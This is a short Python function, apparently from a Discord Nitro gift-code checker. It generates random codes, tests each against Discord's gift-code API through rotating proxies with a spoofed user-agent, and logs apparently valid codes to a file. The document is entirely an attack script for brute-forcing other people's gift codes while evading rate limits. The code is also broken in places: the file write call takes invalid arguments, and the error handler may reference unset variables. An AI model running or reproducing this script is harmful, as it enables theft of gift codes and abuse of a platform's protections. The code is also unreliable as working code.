```python
def getandchk(caracteres, proxys):
    while True:
        for proxy in proxys:
            try:
                proxya = proxy.strip()
                proxy = {'https': proxya}
                header = {'user-agent': 'Mozilla/5.0'}
                code = ('').join(random.choices(string.ascii_letters + string.digits, k=caracteres))
                
                url = ('https://discordapp.com/api/v6/entitlements/gift-codes/{0}?with_application=false&with_subscription_plan=true'.format(code))
                r = requests.get(url=url, proxies=proxy, headers=header, timeout=24)

                if 'Unknown' in r.text:
                    print('#Die', code, proxya)
                else:
                    save = open('goodnitro.txt', 'a')
                    save.write('#Live', code, proxya)
                    save.close()
                    print('#Live', code, proxya)
            except:
                print('#Error', code, proxya)
```